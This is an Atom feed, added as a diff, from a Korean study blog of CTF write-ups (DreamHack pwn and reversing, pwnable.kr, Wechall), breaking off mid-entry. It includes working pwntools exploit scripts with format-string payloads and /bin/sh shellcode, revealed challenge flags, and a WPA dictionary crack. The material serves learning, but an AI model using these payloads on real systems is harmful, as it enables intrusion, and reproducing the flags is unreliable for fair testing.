@@ -1,0 +1,417 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-03-10T03:42:11+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">DalnaraCrater의 공부 블로그</title><subtitle></subtitle><author><name>Yongjin Han</name></author><entry><title type="html">(DreamHack) Basic_exploitation_002</title><link href="http://localhost:4000/security/(DreamHack)-basic-exploitation-002/" rel="alternate" type="text/html" title="(DreamHack) Basic_exploitation_002" /><published>2021-03-05T18:24:00+09:00</published><updated>2021-03-05T18:24:00+09:00</updated><id>http://localhost:4000/security/(DreamHack)-basic-exploitation-002</id><content type="html" xml:base="http://localhost:4000/security/(DreamHack)-basic-exploitation-002/">&lt;h2 id=&quot;풀이&quot;&gt;풀이&lt;/h2&gt;
+&lt;p&gt;Basic_exploitation_002는 FSB (Format String Bug)에 관한 문제이다.&lt;/p&gt;
+
+&lt;p&gt;FSB는 printf, sprintf 등 서식 문자를 사용하는 함수에서 매개변수를 검증하지 않아 발생하는 보안약점이며, 이를 통해 메모리 내용을 볼 수도 있다.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;signal.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+
+
+void alarm_handler() {
+    puts(&quot;TIME OUT&quot;);
+    exit(-1);
+}
+
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+
+void get_shell() {
+    system(&quot;/bin/sh&quot;);
+}
+
+int main(int argc, char *argv[]) {
+
+    char buf[0x80];
+
+    initialize();
+
+    read(0, buf, 0x80);
+    printf(buf);
+
+    exit(0);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;위 코드에서는 printf함수에 buf만이 들어왔기 때문에 취약하다고 볼 수 있다.&lt;br /&gt;
+먼저 buf 변수를 통해 메모리 내용을 확인하고, exit() 함수에 get_shell()함수 주소를 덮어 씌움으로써 쉘을 실행시키도록 한다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110103059-d4bd6a00-7de8-11eb-8f9b-229b895ef366.png&quot; alt=&quot;image&quot; /&gt;
+FSB를 익스플로잇하여 첫번째 서식 문자부터 ‘AAAA’를 참조하는 것을 알 수 있다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110103358-34b41080-7de9-11eb-9bfe-cd3937fb5988.png&quot; alt=&quot;image&quot; /&gt;
+디스어셈블러를 통해 get_shell()의 주소가 0x8048609임을 알아냈다.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-Python&quot;&gt;from pwn import *
+
+p = remote(&quot;host1.dreamhack.games&quot;, 12773)
+elf = ELF(&quot;./basic_exploitation_002&quot;)
+
+exit = elf.got['exit']
+get_shell = 0x8048609
+
+payload = p32(exit)
+payload += p32(exit + 2)
+payload += &quot;%34305d&quot;
+payload += &quot;%1$n&quot;
+payload += &quot;%33275d&quot;
+payload += &quot;%2$n&quot;
+
+p.send(payload)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;fsb-탐지&quot;&gt;FSB 탐지&lt;/h2&gt;
+&lt;p&gt;디스어셈블러와 디버거가 아닌 자동화된 보안약점 분석 도구에서는 어떻게 FSB를 탐지하는지 알아본다. 먼저 FSB는 printf, sprintf 등의 취약한 함수를 사용할 경우 발생할 가능성이 높아지므로 printf_s, sprintf_s 등의 함수를 사용하여야 한다.&lt;/p&gt;
+
+&lt;h3 id=&quot;취약한-함수-이름-검색&quot;&gt;취약한 함수 이름 검색&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Flawfinder&lt;/strong&gt;, &lt;strong&gt;Cppcheck&lt;/strong&gt;과 같은 보안약점 분석기는 위에서 말한 printf와 같은 취약한 함수들을 단순히 검색하여 해당 프로그램이 취약한 지 분석한다.&lt;/p&gt;
+
+&lt;h3 id=&quot;오염-분석-데이터-흐름-분석-taint-analysis-data-flow-analysis&quot;&gt;오염 분석, 데이터 흐름 분석 (Taint analysis, data flow analysis)&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Clang Static Analyzer&lt;/strong&gt;는 오염 분석, 데이터 흐름 분석 등의 분석 기법을 이용하여 메모리 값이 변하는지 직접 확인함으로써 보안약점을 탐지한다.
+&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110103433-4c8b9480-7de9-11eb-8034-817d34e59780.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;두-방식의-장단점&quot;&gt;두 방식의 장단점&lt;/h3&gt;
+&lt;p&gt;단순히 취약한 함수 이름을 검색한다고 해서 취약하다고 탐지된 프로그램이 실제로 취약한 프로그램인지 확실하지 않을 수 있다. (false positive)&lt;br /&gt;
+반면 단순 스트링 매칭 방식이기 때문에 빠른 시간 내에 프로그램을 분석할 수 있는 장점이 있다.&lt;/p&gt;
+
+&lt;p&gt;오염 분석, 데이터 흐름 분석은 프로그램을 실제로 실행하면서 취약점의 존재 유무를 판단하기 때문에 더 정확하다. 그러나 프로그램을 실행하면서 분석하기 때문에 분석 시간이 오래 걸린다는 단점이 있다.&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">풀이 Basic_exploitation_002는 FSB (Format String Bug)에 관한 문제이다.</summary></entry><entry><title type="html">(DreamHack) Basic_exploitation_003</title><link href="http://localhost:4000/security/(DreamHack)-basic-exploitation-003/" rel="alternate" type="text/html" title="(DreamHack) Basic_exploitation_003" /><published>2021-03-05T18:24:00+09:00</published><updated>2021-03-05T18:24:00+09:00</updated><id>http://localhost:4000/security/(DreamHack)-basic-exploitation-003</id><content type="html" xml:base="http://localhost:4000/security/(DreamHack)-basic-exploitation-003/">&lt;h2 id=&quot;풀이&quot;&gt;풀이&lt;/h2&gt;
+
+&lt;p&gt;이번 문제는 FSB와 BOF가 모두 사용된 문제이다.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;signal.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+void alarm_handler() {
+    puts(&quot;TIME OUT&quot;);
+    exit(-1);
+}
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+void get_shell() {
+    system(&quot;/bin/sh&quot;);
+}
+int main(int argc, char *argv[]) {
+    char *heap_buf = (char *)malloc(0x80);
+    char stack_buf[0x90] = {};
+    initialize();
+    read(0, heap_buf, 0x80);
+    sprintf(stack_buf, heap_buf);
+    printf(&quot;ECHO : %s\n&quot;, stack_buf);
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&quot;fsb&quot;&gt;FSB&lt;/h4&gt;
+&lt;p&gt;sprintf는 입력값의 길이에 대한 검사가 없이 사용되고 있으므로 FSB에 의해 익스플로잇될 수 있다. (앞으로는 sprintf_s를 애용하자)&lt;/p&gt;
+&lt;h4 id=&quot;bof&quot;&gt;BOF&lt;/h4&gt;
+&lt;p&gt;sprintf를 통해 heap_buf에서 stack_buf의 내용을 바꾸는데 이때 main의 ret 값을 변조시켜 BOF를 일으킬 수 있다.
+stack_buf와 ret 사이에 0x98 (stack_buf, *heap_buf) + 0x4 (sfp)만큼의 공간이 존재한다.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-Python&quot;&gt;from pwn import *
+
+p = remote(&quot;host1.dreamhack.games&quot;, 24316)
+elf = ELF(&quot;./basic_exploitation_003&quot;)
+
+get_shell = elf.symbols['get_shell']
+
+payload = &quot;%156d&quot;
+payload += p32(get_shell)
+
+p.send(payload)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;위 코드를 통해 쉘을 실행시킬 수 있다.
+&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110102904-a93a7f80-7de8-11eb-9680-9517a32b104e.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">풀이</summary></entry><entry><title type="html">(DreamHack) rev-basic-2</title><link href="http://localhost:4000/security/(DreamHack)-rev-basic-2/" rel="alternate" type="text/html" title="(DreamHack) rev-basic-2" /><published>2021-03-03T18:24:00+09:00</published><updated>2021-03-03T18:24:00+09:00</updated><id>http://localhost:4000/security/(DreamHack)-rev-basic-2</id><content type="html" xml:base="http://localhost:4000/security/(DreamHack)-rev-basic-2/">&lt;h2 id=&quot;풀이&quot;&gt;풀이&lt;/h2&gt;
+
+&lt;p&gt;IDA를 통해 주어진 실행 파일을 디스어셈블링하고 string view를 확인해 보았다. 플래그로 추정되는 문자열을 얻을 수 없어 어셈블리 코드를 살펴보았다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110457204-bbc8f780-810d-11eb-974f-1ab363388b01.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;프로세스가 반복되고 있음을 알 수 있지만 아직 어떤 동작을 하는지 정확하게 해석할 수 없었다. 다만 aC의 주소를 옮겨 사용한다는 것은 알 수 있었고, aC의 값이 담긴 스택을 확인해 보았다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110457996-9be60380-810e-11eb-8c47-5015bdc1928a.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;‘Comp4re_the_arr4y’가 플래그임을 유추할 수 있었다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110458317-f97a5000-810e-11eb-8cad-bd93d2f02769.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;어떨결에 플래그를 찾아내긴 했지만 디스어셈블된 어셈블리 코드를 해석할 수 있었다면 더욱 좋았을 것 같다.&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">풀이</summary></entry><entry><title type="html">(DreamHack) rev-basic-1</title><link href="http://localhost:4000/security/(DreamHack)-rev-basic-1/" rel="alternate" type="text/html" title="(DreamHack) rev-basic-1" /><published>2021-03-03T18:24:00+09:00</published><updated>2021-03-03T18:24:00+09:00</updated><id>http://localhost:4000/security/(DreamHack)-rev-basic-1</id><content type="html" xml:base="http://localhost:4000/security/(DreamHack)-rev-basic-1/">&lt;h2 id=&quot;풀이&quot;&gt;풀이&lt;/h2&gt;
+
+&lt;p&gt;IDA를 통해 주어진 실행 파일을 디스어셈블링하고 string view를 확인해 보았다.&lt;br /&gt;
+플래그로 추정되는 문자열은 찾을 수 없어 비교 연산을 하는 코드가 있는지 찾아보았다. 아래 그림과 같이 문자 하나씩 비교해가며 확인하는 프로세스가 존재하였다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110456181-9a1b4080-810c-11eb-8cff-dffde77c3eaa.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;비교되는 문자들을 아스키코드를 참고하여 변환하면 ‘Compar3_the_ch4ract3r’이라는 문자열을 얻을 수 있다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110456857-6391f580-810d-11eb-9e58-76b7f9a709d4.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">풀이</summary></entry><entry><title type="html">(DreamHack) rev-basic-0</title><link href="http://localhost:4000/security/(DreamHack)-rev-basic-0/" rel="alternate" type="text/html" title="(DreamHack) rev-basic-0" /><published>2021-03-03T18:24:00+09:00</published><updated>2021-03-03T18:24:00+09:00</updated><id>http://localhost:4000/security/(DreamHack)-rev-basic-0</id><content type="html" xml:base="http://localhost:4000/security/(DreamHack)-rev-basic-0/">&lt;h2 id=&quot;풀이&quot;&gt;풀이&lt;/h2&gt;
+
+&lt;p&gt;IDA를 통해 주어진 실행 파일을 디스어셈블링하였다. 우전 string view를 확인하여 플래그처럼 보이는 문자열을 확인하였다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110455212-7dcad400-810b-11eb-9eca-e1f488af9cd1.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;사용자 입력값이 ‘Compar3_the_str1ng’과 일치하는지 비교하는 어셈블리 코드를 확인할 수 있었다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110455373-b5d21700-810b-11eb-95a9-9114ba67de5e.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;예상한대로 찾아낸 문자열을 입력하였더니 Correct가 출력되었다.
+&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110455684-15302700-810c-11eb-91a9-2bdd331ff53d.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">풀이</summary></entry><entry><title type="html">(Dreamhack) basic_exploitation_000</title><link href="http://localhost:4000/security/(DreamHack)-basic_exploitation_000/" rel="alternate" type="text/html" title="(Dreamhack) basic_exploitation_000" /><published>2021-02-24T18:24:00+09:00</published><updated>2021-02-24T18:24:00+09:00</updated><id>http://localhost:4000/security/(DreamHack)-basic_exploitation_000</id><content type="html" xml:base="http://localhost:4000/security/(DreamHack)-basic_exploitation_000/">&lt;h2 id=&quot;문제-풀이&quot;&gt;문제 풀이&lt;/h2&gt;
+
+&lt;p&gt;buf가 지역 변수로 0x80만큼 할당이 되어 있고, 이를 통해 ret 주소와 132바이트만큼 차이난다는 것을 알 수 있다. (buf크기 128바이트 +sfp 4바이트)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/108988447-d182f980-76d7-11eb-90e2-92608229fa4f.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/108988382-bdd79300-76d7-11eb-9245-e8f38c8e64c2.png&quot; alt=&quot;image&quot; /&gt;
+IDA를 이용하여 살펴본 스택 공간&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-Python&quot;&gt;from pwn import *
+
+proc = remote(&quot;host1.dreamhack.games&quot;, 15867)
+
+proc.recvuntil(&quot;buf = (&quot;)
+bufAddr = int(proc.recv(10), 16)
+shellcode = &quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80&quot;
+shellcode += &quot;\x80&quot; * 106
+shellcode += str(p32(bufAddr))
+proc.send(shellcode)
+
+proc.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;buf 공간에 26바이트의 쉘 코드와 아무 의미 없는 ‘A’를 106바이트만큼 채워주고 ret 주소에 buf 주소가 오버플로우될 수 있도록 하였다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/108981294-f1aeba80-76cf-11eb-8786-58c69bc1508a.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;함수-호출-방식&quot;&gt;함수 호출 방식&lt;/h2&gt;
+&lt;p&gt;함수를 호출하는 과정에서 매개변수, 리턴 주소 등을 어떻게 스택에 넣고 정리할 지 정하는 &lt;strong&gt;함수 호출 규약&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/108988472-d9429e00-76d7-11eb-9eaf-b73e7e5238fa.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;sum(a, b)를 호출했다고 가정하자&lt;/p&gt;
+
+&lt;h3 id=&quot;_cdecl&quot;&gt;_cdecl&lt;/h3&gt;
+&lt;p&gt;_cdecl은 c언어에서의 기본 함수 호출 규약이다. 스택을 사용하여 함수 외부에서 공간을 정리한다. (스택 정리는 caller가 함)&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;_stdcall&quot;&gt;_stdcall&lt;/h3&gt;
+&lt;p&gt;_stdcall은 스택을 사용하여 함수 내부에서 공간을 정리한다. WINAPI에서 많이 사용한다. (스택 정리는 callee가 함)&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;함수 리턴시 ret * 8 수행&lt;/p&gt;
+
+&lt;h3 id=&quot;_fastcall&quot;&gt;_fastcall&lt;/h3&gt;
+&lt;p&gt;다른 호출 규약과 달리 레지스터를 이용한다. 레지스터를 이용하므로 속도가 빠르지만 경우에 따라 코드가 길어질 수 있다.&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;_thiscall&quot;&gt;_thiscall&lt;/h3&gt;
+&lt;p&gt;c++에서 사용하는 호출규약으로 _stdcall과 비슷한 구조를 갖는다.&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;c++에서 자기 자신을 가리키는 this 포인터의 주소가 ecx 레지스터에 담기게 된다.&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">문제 풀이</summary></entry><entry><title type="html">(Pwnable) blukat</title><link href="http://localhost:4000/security/(Wechall)-Substitution1/" rel="alternate" type="text/html" title="(Pwnable) blukat" /><published>2021-02-17T18:24:00+09:00</published><updated>2021-02-17T18:24:00+09:00</updated><id>http://localhost:4000/security/(Wechall)-Substitution1</id><content type="html" xml:base="http://localhost:4000/security/(Wechall)-Substitution1/">&lt;h2 id=&quot;문제-풀이&quot;&gt;문제 풀이&lt;/h2&gt;
+&lt;p&gt;ls -l 명령어를 통해 어떠한 파일이 있고 어떤 코드로 구성되어 있는지 확인하였다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/108188675-34621700-7153-11eb-8888-c31cadcaf51f.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;평소와 같으면 바로 실행 파일을 실행하고, c 파일을 살펴 보았겠지만 자세히 살펴보니 password 파일의 소유 그룹이 눈에 띄었다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/108188748-49d74100-7153-11eb-9d3b-43561af1b9ee.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;id 명령어를 통해 내 계정의 uid와 gid를 확인하였다. 확인 결과 내 계정이 속한 그룹이 password 파일에 접근할 수 있음을 알았다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/108188766-5065b880-7153-11eb-8300-a8e4b5b7ce5f.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;password 파일 내용 출력 성공!&lt;/p&gt;
+
+&lt;p&gt;(주의: 자칫 잘못하면 c 소스코드를 분석하여 시간을 낭비할 수 있음.)&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">문제 풀이 ls -l 명령어를 통해 어떠한 파일이 있고 어떤 코드로 구성되어 있는지 확인하였다.</summary></entry><entry><title type="html">(Wechall) A Black Hats Tale</title><link href="http://localhost:4000/security/(Wechall)-A-Black-Hats-Tale/" rel="alternate" type="text/html" title="(Wechall) A Black Hats Tale" /><published>2021-02-10T18:24:00+09:00</published><updated>2021-02-10T18:24:00+09:00</updated><id>http://localhost:4000/security/(Wechall)-A-Black-Hats-Tale</id><content type="html" xml:base="http://localhost:4000/security/(Wechall)-A-Black-Hats-Tale/">&lt;h2 id=&quot;문제-풀이&quot;&gt;문제 풀이&lt;/h2&gt;
+&lt;p&gt;War driving을 통해 은행 본사의 무선 통신을 스니핑하여 통신 데이터 일부를 얻었다 (wpa_psk.cap). 은행은 WPA를 통해 통신을 암호화 하고 있어 스니핑된 데이터는 암호화되어 있다. 따라서 WPA의 키를 알아야 평문을 얻을 수 있다.&lt;/p&gt;
+
+&lt;p&gt;문제에서는 dictionary attack을 사용하여 WPA의 패스워드를 알아내라고 힌트를 주었다.&lt;/p&gt;
+
+&lt;p&gt;해당 문제를 풀기 위해 aircrack-ng 프로그램을 사용하였으며, dictionary list는 따로 다운로드 받았다. (kali linux에는 /pentest/wireless/aircrack-ng/test/password.lst 에 저장되어 있다고 한다.)&lt;/p&gt;
+
+&lt;p&gt;aircrack-ng를 사용하면 다음과 같이 WPA에 사용되는 키가 “jennifer”임을 알 수 있다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img width=&quot;625&quot; alt=&quot;wpa_aircrack&quot; src=&quot;https://user-images.githubusercontent.com/24788751/107494877-acb85d80-6bd2-11eb-9976-f5061bc705c3.png&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;h2 id=&quot;wpa란&quot;&gt;WPA란?&lt;/h2&gt;
+&lt;p&gt;WPA는 Wifi Protected Access의 약자로 WEP를 보안하기 위해 고안되었다.&lt;/p&gt;
+
+&lt;h3 id=&quot;wep&quot;&gt;WEP&lt;/h3&gt;
+&lt;p&gt;Wired Equivalent Privacy는 IV(Initial Vector)와 사전에 공유된 키를 통해 난수를 생성하여 이를 키 스트림으로 사용한다. 또한 암호문에 대해 CRC-32 알고리즘을 사용하여 ICV(Integrity Check Value)를 생성함으로써 무결성을 확인한다.&lt;/p&gt;
+
+&lt;h4 id=&quot;단점&quot;&gt;단점&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;IV의 길이가 24비트로 짧기 때문에 반복되어 사용될 경우 IV 값을 찾아내기 쉬움&lt;/li&gt;
+  &lt;li&gt;고정키를 사용하기 때문에 패킷 수집을 통해 암호분석을 통해 암호키를 찾아내기 쉬움&lt;/li&gt;
+  &lt;li&gt;암호화 알고리즘으로 RC4를 사용하고 있어 자체적으로 취약함&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;wpa&quot;&gt;WPA&lt;/h3&gt;
+&lt;p&gt;WPA는 WEP을 대체하기 위해 TKIP(Temporal Key Integrity Protocol)을 사용한다. TKIP는 RC4를 사용하긴 하지만 &lt;strong&gt;48비트의 확장된 IV 사용, IV의 순차적 증가를 통한 재생 공격 보호&lt;/strong&gt;, CRC-32보다 안전한 &lt;strong&gt;MIC(Message Integrity Check) 알고리즘&lt;/strong&gt; 사용을 통해 위 목적을 실현하려고 하였다.&lt;/p&gt;
+
+&lt;h4 id=&quot;단점-1&quot;&gt;단점&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;RC4의 취약점이 그대로 남겨짐&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;wpa2&quot;&gt;WPA2&lt;/h3&gt;
+&lt;p&gt;WPA의 TKIP를 보안하기 위해 AES를 사용하는 CCMP(Counter mode with CBC-MAC Protocol) 암호화 방식을 적용하였다. 128비트의 대칭키와 48비트의 IV를 사용하고 무결성 보장과 replay attack를 방지할 수 있다.&lt;/p&gt;
+
+&lt;h3 id=&quot;wpa-pskwi-fi-protected-access-pre-shared-key&quot;&gt;WPA-PSK(Wi-Fi Protected Access Pre-Shared Key)&lt;/h3&gt;
+&lt;p&gt;인증 서버가 설치되지 않은 소규모 망에서 사용되는 방식이다. 동일한 공유키를 갖고 있는지 확인하기 위해 802.1x에 규정된 EAPoL-Key 프레임을 활용하여 4-way handshake를 통해 인증을 수행한다. 암호화키가 1만개의 패킷마다 바뀌는 것이 특징이다.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;암호키가 짧거나 추측하기 쉬운 값일 경우 사전 공격 (dictionary attack)에 취약함 (사전의 성능에 좌우됨)
+&lt;img width=&quot;1226&quot; alt=&quot;wpa_wireshark&quot; src=&quot;https://user-images.githubusercontent.com/24788751/107497481-fce4ef00-6bd5-11eb-9ba2-d2556f117e3c.png&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Yongjin Han</name></author><summary type="html">문제 풀이 War driving을 통해 은행 본사의 무선 통신을 스니핑하여 통신 데이터 일부를 얻었다 (wpa_psk.cap). 은행은 WPA를 통해 통신을 암호화 하고 있어 스니핑된 데이터는 암호화되어 있다. 따라서 WPA의 키를 알아야 평문을 얻을 수 있다.</summary></entry><entry><title type="html">(Wechall) Regex 1</title><link href="http://localhost:4000/security/(Wechall)-Regex/" rel="alternate" type="text/html" title="(Wechall) Regex 1" /><published>2021-02-03T18:24:00+09:00</published><updated>2021-02-03T18:24:00+09:00</updated><id>http://localhost:4000/security/(Wechall)-Regex</id><content type="html" xml:base="http://localhost:4000/security/(Wechall)-Regex/">&lt;h1 id=&quot;wechall-training-regex-write-up&quot;&gt;(Wechall) Training Regex write up&lt;/h1&gt;
+
+&lt;p&gt;Regex 정규표현식 문법을 이용하여 empty string을 매칭하는 정규 표현식 찾기&lt;/p&gt;
+
+&lt;p&gt;답&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-Java&quot;&gt;/^$/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;출처: http://www.wechall.net/challenge/training/regex/index.php&lt;/p&gt;
+
+&lt;h1 id=&quot;wechall-training-caesar-2-write-up&quot;&gt;(Wechall) Training Caesar 2 write up&lt;/h1&gt;
+
+&lt;p&gt;시저 암호는 고전 암호 알고리즘 중 하나로 Key만큼 문자열을 치환시켜 암호문을 얻는다. (복호화 과정은 그 반대)
